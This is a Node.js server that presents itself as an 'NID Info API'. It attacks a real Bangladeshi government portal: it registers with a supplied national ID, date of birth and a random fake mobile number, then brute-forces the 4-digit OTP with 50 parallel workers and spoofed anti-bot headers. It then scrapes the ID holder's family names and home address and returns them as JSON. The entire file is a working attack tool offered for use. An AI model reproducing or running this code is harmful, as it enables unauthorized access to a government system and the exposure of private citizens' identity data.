const express = require('express');
const axios = require('axios');
const cors = require('cors');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// Configuration
const MOBILE_PREFIX = "016";
const BATCH_SIZE = 500;
const MAX_WORKERS = 50;
const TARGET_LOCATION = "http://fsmms.dgf.gov.bd/bn/step2/movementContractor/form";

// Enhanced headers from Python code
const BASE_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    
    'Accept-Language': 'en-US,en;q=0.9',
    
    'Cache-Control': 'no-cache',
    
    'Pragma': 'no-cache',
    
    'sec-ch-ua': '"Google Chrome";v="121", "Chromium";v="121", "Not A(Brand";v="99"',
    'sec-ch-ua-platform': '"Windows"',
    'sec-ch-ua-mobile': '?0',
    
    'Upgrade-Insecure-Requests': '1',
    
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    
    'Referer': 'https://fsmms.dgf.gov.bd/',
    'Origin': 'https://fsmms.dgf.gov.bd',
    
    // Anti-bot natural browser headers
    'Priority': 'u=0, i',
    'DNT': '1',
    'Connection': 'keep-alive'
};

// Helper functions
function randomMobile(prefix) {
    return prefix + Math.random().toString().slice(2, 10);
}

function randomPassword() {
    const uppercase = String.fromCharCode(65 + Math.floor(Math.random() * 26));
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let randomChars = '';
    for (let i = 0; i < 8; i++) {
        randomChars += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return "#" + uppercase + randomChars;
}

function generateOTPRange() {
    const range = [];
    for (let i = 0; i < 10000; i++) {
        range.push(i.toString().padStart(4, '0'));
    }
    return range;
}

// Enhanced session creation with proper headers
async function getSessionAndBypass(nid, dob, mobile, password) {
    try {
        console.log(' Starting session creation...');
        const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor';
        
        const headers = {
            ...BASE_HEADERS,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/movementContractor'
        };

        const data = {
            "nidNumber": nid,
            "email": "",
            "mobileNo": mobile,
            "dateOfBirth": dob,
            "password": password,
            "confirm_password": password,
            "next1": ""
        };

        console.log(' Sending bypass request...');
        const response = await axios.post(url, data, {
            maxRedirects: 0,
            validateStatus: null,
            headers: headers,
            timeout: 10000
        });

        console.log(` Response status: ${response.status}`);
        console.log(` Location header: ${response.headers.location}`);

        if (response.status === 302 && response.headers.location && response.headers.location.includes('mov-verification')) {
            const cookies = response.headers['set-cookie'];
            console.log(' Cookies received:', cookies ? cookies.length : 0);
            
            if (!cookies || cookies.length === 0) {
                throw new Error('No cookies received from server');
            }

            return {
                cookies: cookies,
                session: axios.create({
                    headers: {
                        ...BASE_HEADERS,
                        'Cookie': cookies.join('; ')
                    },
                    timeout: 10000
                })
            };
        } else {
            throw new Error('Bypass Failed - Check NID and DOB');
        }
    } catch (error) {
        console.error(' Session creation error:', error.message);
        throw new Error('Session creation failed: ' + error.message);
    }
}

async function tryOTP(session, cookies, otp) {
    try {
        const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step';
        
        const headers = {
            ...BASE_HEADERS,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': cookies.join('; '),
            'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
        };

        const data = {
            "otpDigit1": otp[0],
            "otpDigit2": otp[1],
            "otpDigit3": otp[2],
            "otpDigit4": otp[3]
        };

        const response = await session.post(url, data, {
            maxRedirects: 0,
            validateStatus: null,
            headers: headers,
            timeout: 10000
        });

        console.log(` OTP ${otp} - Status: ${response.status}, Location: ${response.headers.location}`);

        if (response.status === 302 && response.headers.location && response.headers.location.includes(TARGET_LOCATION)) {
            console.log(` OTP ${otp} SUCCESS!`);
            return otp;
        }
        return null;
    } catch (error) {
        console.log(` OTP ${otp} failed: ${error.message}`);
        return null;
    }
}

// Worker thread processing function
function createWorker(workerBatch, cookies, workerId) {
    return new Promise((resolve, reject) => {
        const workerCode = `
            const { parentPort, workerData } = require('worker_threads');
            const axios = require('axios');
            
            const BASE_HEADERS = ${JSON.stringify(BASE_HEADERS)};
            
            async function tryOTP(session, cookies, otp) {
                try {
                    const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step';
                    
                    const headers = {
                        ...BASE_HEADERS,
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Cookie': cookies.join('; '),
                        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
                    };

                    const data = {
                        "otpDigit1": otp[0],
                        "otpDigit2": otp[1],
                        "otpDigit3": otp[2],
                        "otpDigit4": otp[3]
                    };

                    const response = await session.post(url, data, {
                        maxRedirects: 0,
                        validateStatus: null,
                        headers: headers,
                        timeout: 10000
                    });

                    if (response.status === 302 && response.headers.location && response.headers.location.includes('http://fsmms.dgf.gov.bd/bn/step2/movementContractor/form')) {
                        return otp;
                    }
                    return null;
                } catch (error) {
                    return null;
                }
            }

            (async () => {
                const { otpBatch, cookies, workerId } = workerData;
                const session = axios.create({
                    headers: {
                        ...BASE_HEADERS,
                        'Cookie': cookies.join('; ')
                    },
                    timeout: 10000
                });

                try {
                    console.log(\` Worker \${workerId} started with \${otpBatch.length} OTPs\`);
                    
                    for (let i = 0; i < otpBatch.length; i++) {
                        const otp = otpBatch[i];
                        const result = await tryOTP(session, cookies, otp);
                        if (result) {
                            parentPort.postMessage({ 
                                foundOTP: result,
                                workerId: workerId 
                            });
                            return;
                        }
                        
                        // প্রতি 100 OTP এ প্রোগ্রেস রিপোর্ট
                        if (i % 100 === 0) {
                            console.log(\` Worker \${workerId} progress: \${i}/\${otpBatch.length}\`);
                        }
                    }
                    
                    console.log(\` Worker \${workerId} completed - OTP not found\`);
                    parentPort.postMessage({ 
                        foundOTP: null,
                        workerId: workerId 
                    });
                } catch (error) {
                    console.log(\` Worker \${workerId} error: \${error.message}\`);
                    parentPort.postMessage({ 
                        error: error.message,
                        workerId: workerId 
                    });
                }
            })();
        `;

        const worker = new Worker(workerCode, {
            eval: true,
            workerData: {
                otpBatch: workerBatch,
                cookies: cookies,
                workerId: workerId
            }
        });

        worker.on('message', (message) => {
            if (message.foundOTP) {
                console.log(` Worker ${workerId} found OTP: ${message.foundOTP}`);
                resolve(message.foundOTP);
                worker.terminate();
            } else if (message.error) {
                console.error(` Worker ${workerId} error: ${message.error}`);
                reject(new Error(`Worker ${workerId} error: ${message.error}`));
            } else {
                console.log(` Worker ${workerId} completed without finding OTP`);
                resolve(null);
            }
        });

        worker.on('error', (error) => {
            console.error(` Worker ${workerId} thread error:`, error);
            reject(error);
        });

        worker.on('exit', (code) => {
            console.log(` Worker ${workerId} exited with code: ${code}`);
            if (code !== 0) {
                reject(new Error(`Worker ${workerId} stopped with exit code ${code}`));
            }
        });
    });
}

// Parallel worker processing
async function tryBatchWithWorkers(cookies, otpBatch, maxWorkers = 50) {
    const batchSize = Math.ceil(otpBatch.length / maxWorkers);
    const workers = [];
    
    console.log(` Starting ${maxWorkers} workers with ${batchSize} OTPs each`);
    console.log(` Total OTPs to try: ${otpBatch.length}`);

    // Create all worker promises
    for (let i = 0; i < maxWorkers; i++) {
        const start = i * batchSize;
        const end = start + batchSize;
        const workerBatch = otpBatch.slice(start, end);
        
        if (workerBatch.length === 0) continue;

        workers.push(
            createWorker(workerBatch, cookies, i + 1)
                .catch(error => {
                    console.error(`Worker ${i + 1} error:`, error.message);
                    return null;
                })
        );
    }

    // Use Promise.race to get the first successful result
    return new Promise((resolve) => {
        let completed = 0;
        let found = false;

        workers.forEach((workerPromise, index) => {
            workerPromise.then(result => {
                completed++;
                
                if (result && !found) {
                    found = true;
                    console.log(`🎉 Worker ${index + 1} found OTP: ${result}`);
                    
                    // অন্যান্য ওয়ার্কার বন্ধ করুন
                    workers.forEach((wp, i) => {
                        if (i !== index) {
                            // ওয়ার্কার টার্মিনেট করা যায় না, কিন্তু রেজাল্ট ইগনোর করব
                        }
                    });
                    
                    resolve(result);
                } else if (completed === workers.length && !found) {
                    console.log(' All workers completed, OTP not found');
                    resolve(null);
                }
            });
        });

        // 30 second timeout
        setTimeout(() => {
            if (!found) {
                console.log(' Timeout reached after 30 seconds');
                resolve(null);
            }
        }, 30000);
    });
}

async function fetchFormData(session, cookies) {
    try {
        const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/form';
        
        const headers = {
            ...BASE_HEADERS,
            'Cookie': cookies.join('; '),
            'Sec-Fetch-Site': 'cross-site',
            'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
        };

        const response = await session.get(url, { headers: headers });
        return response.data;
    } catch (error) {
        throw new Error('Form data fetch failed: ' + error.message);
    }
}

function extractFields(html, ids) {
    const result = {};

    ids.forEach(field_id => {
        const regex = new RegExp(`<input[^>]*id="${field_id}"[^>]*value="([^"]*)"`);
        const match = html.match(regex);
        result[field_id] = match ? match[1] : "";
    });

    return result;
}

function enrichData(contractor_name, result, nid, dob) {
    const mapped = {
        "nameBangla": contractor_name,
        "nameEnglish": "",
        "nationalId": nid,
        "dateOfBirth": dob,
        "fatherName": result.fatherName || "",
        "motherName": result.motherName || "",
        "spouseName": result.spouseName || "",
        "gender": "",
        "religion": "",
        "birthPlace": result.nidPerDistrict || "",
        "nationality": result.nationality || "",
        "division": result.nidPerDivision || "",
        "district": result.nidPerDistrict || "",
        "upazila": result.nidPerUpazila || "",
        "union": result.nidPerUnion || "",
        "village": result.nidPerVillage || "",
        "ward": result.nidPerWard || "",
        "zip_code": result.nidPerZipCode || "",
        "post_office": result.nidPerPostOffice || ""
    };

    const address_parts = [
        `বাসা/হোল্ডিং: ${result.nidPerHolding || '-'}`,
        `গ্রাম/রাস্তা: ${result.nidPerVillage || ''}`,
        `মৌজা/মহল্লা: ${result.nidPerMouza || ''}`,
        `ইউনিয়ন ওয়ার্ড: ${result.nidPerUnion || ''}`,
        `ডাকঘর: ${result.nidPerPostOffice || ''} - ${result.nidPerZipCode || ''}`,
        `উপজেলা: ${result.nidPerUpazila || ''}`,
        `জেলা: ${result.nidPerDistrict || ''}`,
        `বিভাগ: ${result.nidPerDivision || ''}`
    ];

    const filtered_parts = address_parts.filter(part => {
        const parts = part.split(": ");
        return parts[1] && parts[1].trim() && parts[1] !== "-";
    });

    const address_line = filtered_parts.join(", ");

    mapped.permanentAddress = address_line;
    mapped.presentAddress = address_line;

    return mapped;
}

// API Routes
app.get('/', (req, res) => {
    res.json({
        message: 'Enhanced NID Info API is running',
        status: 'active',
        endpoints: {
            getInfo: '/get-info?nid=YOUR_NID&dob=YYYY-MM-DD'
        },
        features: {
            enhancedHeaders: true,
            parallelWorkers: true,
            improvedPasswordGeneration: true,
            mobilePrefix: MOBILE_PREFIX,
            maxWorkers: MAX_WORKERS
        }
    });
});

app.get('/get-info', async(req, res) => {
    try {
        const { nid, dob, debug, test } = req.query;

        if (!nid || !dob) {
            return res.status(400).json({ error: 'NID and DOB are required' });
        }

        console.log(` Processing request for NID: ${nid}, DOB: ${dob}`);
        const startTime = Date.now();

        // Generate random credentials with enhanced password
        const password = randomPassword();
        const mobile = randomMobile(MOBILE_PREFIX);

        console.log(` Using Mobile: ${mobile}`);
        console.log(` Using Password: ${password}`);

        // 1. Get session and bypass initial verification
        console.log(' Step 1: Getting session and bypassing verification...');
        const sessionResult = await getSessionAndBypass(nid, dob, mobile, password);
        if (!sessionResult) {
            throw new Error('Session creation failed');
        }
        
        const { session, cookies } = sessionResult;
        console.log(' Initial bypass successful');

        // টেস্ট মোড: শুধুমাত্র 100 OTP দিয়ে টেস্ট করার জন্য
        let otpRange = generateOTPRange();
        
        if (test === 'true') {
            console.log(' TEST MODE: Using only first 100 OTPs');
            otpRange = otpRange.slice(0, 100);
        } else {
            // Enhanced shuffling
            console.log('🔀 Shuffling OTP range...');
            for (let i = otpRange.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [otpRange[i], otpRange[j]] = [otpRange[j], otpRange[i]];
            }
        }

        console.log(` Total OTPs to try: ${otpRange.length}`);

        // 3. Try OTPs with parallel workers
        console.log(` Step 3: Brute-forcing OTP with ${MAX_WORKERS} parallel workers...`);
        let foundOTP = await tryBatchWithWorkers(cookies, otpRange, MAX_WORKERS);

        const endTime = Date.now();
        const duration = (endTime - startTime) / 1000;

        if (foundOTP) {
            // 4. Fetch form data
            console.log(' Step 4: Fetching form data...');
            const html = await fetchFormData(session, cookies);

            const ids = [
                "contractorName", "fatherName", "motherName", "spouseName", 
                "nidPerDivision", "nidPerDistrict", "nidPerUpazila", "nidPerUnion", 
                "nidPerVillage", "nidPerWard", "nidPerZipCode", "nidPerPostOffice",
                "nidPerHolding", "nidPerMouza"
            ];

            const extractedData = extractFields(html, ids);
            const finalData = enrichData(extractedData.contractorName || "", extractedData, nid, dob);

            console.log(`✅ Success: Data retrieved in ${duration} seconds`);
            
            res.json({
                success: true,
                data: finalData,
                sessionInfo: {
                    mobileUsed: mobile,
                    otpFound: foundOTP,
                    duration: `${duration} seconds`,
                    workersUsed: MAX_WORKERS
                }
            });

        } else {
            console.log(` Error: OTP not found after ${duration} seconds`);
            res.status(404).json({ 
                success: false,
                error: "OTP not found after trying all combinations",
                duration: `${duration} seconds`,
                triedOTPs: otpRange.length,
                workersUsed: MAX_WORKERS
            });
        }

    } catch (error) {
        console.error(' Error:', error.message);
        res.status(500).json({ 
            success: false,
            error: error.message 
        });
    }
});

// Enhanced health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        timestamp: new Date().toISOString(),
        service: 'Enhanced NID Info API',
        version: '3.0.0',
        workers: MAX_WORKERS
    });
});

// New endpoint to test credentials generation
app.get('/test-creds', (req, res) => {
    const mobile = randomMobile(MOBILE_PREFIX);
    const password = randomPassword();
    
    res.json({
        mobile: mobile,
        password: password,
        note: 'These are randomly generated test credentials'
    });
});

// New debug endpoint
app.get('/debug-session', async (req, res) => {
    try {
        const { nid, dob } = req.query;
        
        if (!nid || !dob) {
            return res.status(400).json({ error: 'NID and DOB are required' });
        }
        
        const password = randomPassword();
        const mobile = randomMobile(MOBILE_PREFIX);
        
        console.log('🧪 Debug session creation...');
        const result = await getSessionAndBypass(nid, dob, mobile, password);
        
        res.json({
            success: true,
            sessionCreated: !!result,
            mobile: mobile,
            password: password,
            cookiesCount: result.cookies.length
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Start server only if this is the main thread
if (isMainThread) {
    app.listen(PORT, () => {
        console.log(` Enhanced NID Info API running on port ${PORT}`);
        console.log(` Main endpoint: http://localhost:${PORT}/get-info?nid=YOUR_NID&dob=YYYY-MM-DD`);
        console.log(` Parallel Workers: ${MAX_WORKERS} workers`);
        console.log(` Test endpoint: http://localhost:${PORT}/test-creds`);
        console.log(` Debug endpoint: http://localhost:${PORT}/debug-session`);
        console.log(` Health check: http://localhost:${PORT}/health`);
        console.log(` Test mode: http://localhost:${PORT}/get-info?nid=YOUR_NID&dob=YYYY-MM-DD&test=true`);
    });
}
